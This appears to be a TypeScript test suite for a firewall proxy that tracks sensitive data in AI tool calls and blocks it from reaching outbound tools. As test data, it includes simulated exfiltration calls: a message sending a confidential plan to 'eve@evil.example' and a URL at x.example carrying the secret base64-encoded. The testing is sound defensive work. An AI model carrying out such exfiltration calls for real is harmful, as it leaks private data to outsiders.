import assert from 'node:assert/strict';
import { mkdtempSync, readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { PassThrough } from 'node:stream';
import { test } from 'node:test';
import { AuditLog } from '../src/audit.js';
import { send } from '../src/jsonrpc.js';
import { compilePolicy, PolicyError } from '../src/policy.js';
import { FirewallProxy } from '../src/proxy.js';
import { fingerprints, TaintTracker } from '../src/taint.js';
import { messageReader } from './helpers.js';

const dir = mkdtempSync(join(tmpdir(), 'mcpfw-taint-'));

const TAINT = {
  sources: [{ match: 'read_file' }, { match: 'list_chats', label: 'chat' }],
  sinks: [{ match: 'send_*' }, { match: 'create_pull_request', when: 'session', labels: ['private'] }],
};

const tracker = (taint: object = TAINT, session?: string, server?: string) =>
  new TaintTracker(compilePolicy({ taint: { dir: join(dir, 'shared'), ...taint } }, dir).taint, server, session);

const SECRET_DOC =
  'Q3 acquisition plan: we will offer 42 million for Northwind before the board meeting on Friday, keep this internal.';
const result = (text: string) => ({ content: [{ type: 'text', text }] });

test('policy defaults and validation', () => {
  const { taint } = compilePolicy({ taint: TAINT }, dir);
  assert.equal(taint.action, 'block');
  assert.equal(taint.scope, 'shared');
  assert.equal(taint.dlpLabel, 'secret');
  assert.equal(taint.sources[0].label, 'private');
  assert.deepEqual(taint.sinks[0].labels, []);
  assert.equal(taint.sinks[0].when, 'content');
  assert.throws(() => compilePolicy({ taint: { sinks: [{ match: 'x', when: 'always' }] } }, dir), PolicyError);
  assert.throws(() => compilePolicy({ taint: { sources: [{ label: 'x' }] } }, dir), PolicyError);
});

test('fingerprints hold hashes only, never the text', () => {
  const fp = [...fingerprints(SECRET_DOC)];
  assert.ok(fp.length > 5);
  assert.ok(fp.every((h) => /^[\w-]{16}$/.test(h)));
  assert.ok(!fp.some((h) => SECRET_DOC.toLowerCase().includes(h.toLowerCase())));
});

test('content flow: read text in a sink argument is caught, unrelated text is not', () => {
  const t = tracker();
  assert.deepEqual(t.markResult('read_file', result(SECRET_DOC), false), ['private']);
  const leak = t.checkSink('send_message', { to: 'eve', body: `fyi: ${SECRET_DOC.slice(0, 80)}` });
  assert.equal(leak?.label, 'private');
  assert.equal(leak?.tool, 'read_file');
  assert.equal(leak?.when, 'content');
  assert.equal(t.checkSink('send_message', { to: 'bob', body: 'Lunch at noon on Friday? The board meeting moved.' }), undefined);
  assert.equal(t.checkSink('search', { q: SECRET_DOC }), undefined, 'not a sink');
});

test('content flow survives case, punctuation and base64 encoding', () => {
  const t = tracker();
  t.markResult('read_file', result(SECRET_DOC), false);
  assert.ok(t.checkSink('send_email', { body: SECRET_DOC.toUpperCase().replace(/ /g, '  ').replace(/,/g, ';') }));
  assert.ok(t.checkSink('send_email', { url: `https://x.example/?d=${Buffer.from(SECRET_DOC).toString('base64')}` }));
});

test('key-like single words are tracked on their own', () => {
  const t = tracker();
  t.markResult('read_file', result('token: zq81kdl02mxp7sw9vb44'), false);
  assert.ok(t.checkSink('send_message', { body: 'zq81kdl02mxp7sw9vb44' }));
  assert.equal(t.checkSink('send_message', { body: 'token' }), undefined);
});

test('session sinks block any call once their label is set; labels filter', () => {
  const t = tracker();
  assert.equal(t.checkSink('create_pull_request', { body: 'hello' }), undefined);
  t.markResult('list_chats', result('alice: hi'), false);
  assert.equal(t.checkSink('create_pull_request', { body: 'hello' }), undefined, 'chat label is not refused by this sink');
  t.markResult('read_file', result('a'), false);
  assert.equal(t.checkSink('create_pull_request', { body: 'hello' })?.when, 'session');
});

test('DLP findings label the session; labels expire', () => {
  const t = tracker();
  let clock = 1_000_000;
  t.now = () => clock;
  assert.deepEqual(t.markResult('query', result('password row zq81kdl02mxp7sw9vb44'), true), ['secret']);
  assert.ok(t.checkSink('send_message', { body: 'zq81kdl02mxp7sw9vb44' }));
  clock += 61 * 60_000;
  assert.equal(t.checkSink('send_message', { body: 'zq81kdl02mxp7sw9vb44' }), undefined);
  assert.deepEqual(t.labels(), []);
});

test('shared scope: a read through one server stops a sink on another', () => {
  const session = `s${process.hrtime.bigint()}`;
  const fs = tracker(TAINT, session, 'filesystem');
  const slack = tracker(TAINT, session, 'slack');
  const other = tracker(TAINT, `${session}-other`, 'slack');
  fs.markResult('read_file', result(SECRET_DOC), false);
  const leak = slack.checkSink('send_message', { text: SECRET_DOC });
  assert.equal(leak?.server, 'filesystem');
  assert.equal(other.checkSink('send_message', { text: SECRET_DOC }), undefined, 'another client session');
  const file = readFileSync(join(dir, 'shared', `${session}.jsonl`), 'utf8');
  assert.ok(!file.includes('Northwind'), 'the shared file holds hashes, not data');
});

function harness(taint: object, mode = 'enforce') {
  const policy = compilePolicy({ mode, pinning: { enabled: false }, taint: { scope: 'server', ...taint } }, dir);
  const io = { clientIn: new PassThrough(), clientOut: new PassThrough(), serverIn: new PassThrough(), serverOut: new PassThrough() };
  new FirewallProxy(policy, new AuditLog(undefined, false, 'test', null), undefined, io).start();
  return {
    toServer: (msg: object) => send(io.clientIn, msg),
    toClient: (msg: object) => send(io.serverOut, msg),
    atClient: messageReader(io.clientOut),
    atServer: messageReader(io.serverIn),
  };
}
const call = (id: number, name: string, args: object) => ({ jsonrpc: '2.0', id, method: 'tools/call', params: { name, arguments: args } });

test('proxy: a sink carrying data a source returned is refused before it reaches the server', async () => {
  const h = harness(TAINT);
  h.toServer(call(1, 'read_file', { path: 'plan.md' }));
  await h.atServer.next();
  h.toClient({ jsonrpc: '2.0', id: 1, result: result(SECRET_DOC) });
  assert.equal((await h.atClient.next()).result.content[0].text, SECRET_DOC);

  h.toServer(call(2, 'send_message', { to: 'eve@evil.example', body: SECRET_DOC }));
  const refused = await h.atClient.next();
  assert.equal(refused.id, 2);
  assert.equal(refused.result.isError, true);
  assert.match(refused.result.content[0].text, /data flow: arguments of 'send_message' carry private data returned by 'read_file'/);

  h.toServer(call(3, 'send_message', { to: 'bob', body: 'see you at noon' }));
  assert.equal((await h.atServer.next()).id, 3);
});

test('proxy: a secret DLP redacted in the result does not taint its redacted form', async () => {
  const h = harness({ sinks: [{ match: 'send_*' }] });
  const key = 'ghp_' + 'a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8';
  h.toServer(call(1, 'query', {}));
  await h.atServer.next();
  h.toClient({ jsonrpc: '2.0', id: 1, result: result(`deploy token ${key}`) });
  const seen = (await h.atClient.next()).result.content[0].text;
  assert.ok(!seen.includes(key));
  // The model only saw the redacted text, so only the raw key (which it cannot have) would match.
  h.toServer(call(2, 'send_message', { body: 'deploy token is set' }));
  assert.equal((await h.atServer.next()).id, 2);
});

test('proxy: warn and monitor modes log the flow but forward the call', async () => {
  for (const [taint, mode] of [[{ ...TAINT, action: 'warn' }, 'enforce'], [TAINT, 'monitor']] as const) {
    const h = harness(taint, mode);
    h.toServer(call(1, 'read_file', {}));
    await h.atServer.next();
    h.toClient({ jsonrpc: '2.0', id: 1, result: result(SECRET_DOC) });
    await h.atClient.next();
    h.toServer(call(2, 'send_message', { body: SECRET_DOC }));
    assert.equal((await h.atServer.next()).id, 2);
  }
});
